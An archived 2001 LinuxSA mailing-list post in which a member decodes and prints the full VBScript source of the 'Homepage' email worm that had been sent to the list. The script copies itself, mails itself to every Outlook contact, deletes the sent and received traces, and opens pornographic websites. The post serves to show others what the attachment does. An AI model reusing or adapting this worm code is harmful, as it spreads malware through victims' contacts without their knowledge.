<HTML>
<!-- EmailData="Start" -->
<!-- Version="1.1" -->
<!-- Subject="RE:  Homepage - decoded" -->
<!-- FromName="'David de Groot'" -->
<!-- FromEmail="david@viking.org.au" -->
<!-- ToName="'LinuxSA Mailing List'" -->
<!-- ToEmail="linuxsa@linuxsa.org.au" -->
<!-- Date="Wed, 9 May 2001 20:10:50 +0930" -->
<!-- Id="2475892587.20010509201050@viking.org.au" -->
<!-- Reference="010601c0d856$9631b140$20011eac@nci.com.au" -->
<!-- X-Face="" -->
<!-- X-URL="" -->
<!-- EmailData="End" -->
<HEAD>
<TITLE>LinuxSA Mailing List: RE:  Homepage - decoded</TITLE>
</HEAD>
<BODY BGCOLOR=#FFFFFF><H1>LinuxSA Mailing list archives</H1>
<!-- IndexControl1="Start" -->
Index:
[<A HREF="thread.html">thread</A>]
[<A HREF="date.html">date</A>]
[<A HREF="subject.html">subject</A>]
[<A HREF="author.html">author</A>]
[<A HREF="stats.html">stats</A>]
<HR>
<!-- IndexControl1="End" -->
<!-- Header="Start" -->
<PRE>
  From: David de Groot &lt;<I><A HREF="mailto:david@viking.org.au">david@viking.org.au</A></I>&gt;
  To  : LinuxSA Mailing List &lt;<I><A HREF="mailto:linuxsa@linuxsa.org.au">linuxsa@linuxsa.org.au</A></I>&gt;
  Date: Wed, 9 May 2001 20:10:50 +0930
</PRE>
<H1>RE:  Homepage - decoded</H1>
<!-- Header="End" -->
<!-- Body="Start" -->
<PRE>
Wednesday, May 09, 2001, 4:36:36 PM, Ian wrote:


&gt; Hi!

&gt; You've got to see this page! It's really cool ;O)


And because I was bored (and felt the need to code in C), I've decoded
the  binary portion of the previously attached virus...

The results are below:

On Error Resume Next
Set WS = CreateObject("WScript.Shell")
Set FSO= Createobject("scripting.filesystemobject")
Folder=FSO.GetSpecialFolder(2)

Set InF=FSO.OpenTextFile(WScript.ScriptFullname,1)
Do While InF.AtEndOfStream&lt;&gt;True
ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf
Loop

Set OutF=FSO.OpenTextFile(Folder&"\homepage.HTML.vbs",2,true)
OutF.write ScriptBuffer
OutF.close
Set FSO=Nothing

If WS.regread ("HKCU\software\An\mailed") &lt;&gt; "1" then
Mailit()
End If

Set s=CreateObject("Outlook.Application")
Set t=s.GetNameSpace("MAPI")
Set u=t.GetDefaultFolder(6)
For i=1 to u.items.count
If u.Items.Item(i).subject="Homepage" Then
u.Items.Item(i).close
u.Items.Item(i).delete
End If
Next
Set u=t.GetDefaultFolder(3)
For i=1 to u.items.count
If u.Items.Item(i).subject="Homepage" Then
u.Items.Item(i).delete
End If
Next

Randomize
r=Int((4*Rnd)+1)
If r=1 then
WS.Run("<A HREF="http://hardcore.pornbillboard.net/shannon/1.htm">http://hardcore.pornbillboard.net/shannon/1.htm</A>")
elseif r=2 Then
WS.Run("<A HREF="http://members.nbci.com/_XMCM/prinzje/1.htm">http://members.nbci.com/_XMCM/prinzje/1.htm</A>")
elseif r=3 Then
WS.Run("<A HREF="http://www2.sexcropolis.com/amateur/sheila/1.htm">http://www2.sexcropolis.com/amateur/sheila/1.htm</A>")
ElseIf r=4 Then
WS.Run("<A HREF="http://sheila.issexy.tv/1.htm">http://sheila.issexy.tv/1.htm</A>")
End If

Function Mailit()
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
        Set Mapi=Outlook.GetNameSpace("MAPI")
        Set Lists=Mapi.AddressLists
        For Each ListIndex In Lists
                If ListIndex.AddressEntries.Count &lt;&gt; 0 Then
                        ContactCount = ListIndex.AddressEntries.Count
                        For Count= 1 To ContactCount
                                Set Mail = Outlook.CreateItem(0)
                                Set Contact = ListIndex.AddressEntries(Count)
                                Mail.To = Contact.Address
                                Mail.Subject = "Homepage"
                                Mail.Body = vbcrlf&"Hi!"&vbcrlf&vbcrlf&"You've got to see this page! It's really cool ;O)"&vbcrlf&vbcrlf
                                Set Attachment=Mail.Attachments
                                Attachment.Add Folder & "\homepage.HTML.vbs"
                                Mail.DeleteAfterSubmit = True
                                If Mail.To &lt;&gt; "" Then
                                Mail.Send
                                WS.regwrite "HKCU\software\An\mailed", "1"
                        End If
                        Next
                End If
        Next
End if
End Function


-- 
David de Groot                          mailto:<A HREF="mailto:david@viking.org.au">david@viking.org.au</A>
<A HREF="http://vikings.homeip.net/~david">http://vikings.homeip.net/~david</A>


-- 
LinuxSA WWW: <A HREF="http://www.linuxsa.org.au/">http://www.linuxsa.org.au/</A>  IRC: #linuxsa on irc.linux.org.au
To unsubscribe from the LinuxSA list:
  mail <A HREF="mailto:linuxsa-request@linuxsa.org.au">linuxsa-request@linuxsa.org.au</A> with "unsubscribe" as the subject

</PRE>
<!-- Body="End" -->
<!-- IndexControl2="Start" -->
<HR>
Index:
[<A HREF="thread.html">thread</A>]
[<A HREF="date.html">date</A>]
[<A HREF="subject.html">subject</A>]
[<A HREF="author.html">author</A>]
[<A HREF="stats.html">stats</A>]
<!-- IndexControl2="End" -->
<HR><FONT SIZE=+1>Return to the <A HREF=/mailing-list/>LinuxSA Mailing List Information</A> Page</FONT></BODY>
</HTML>
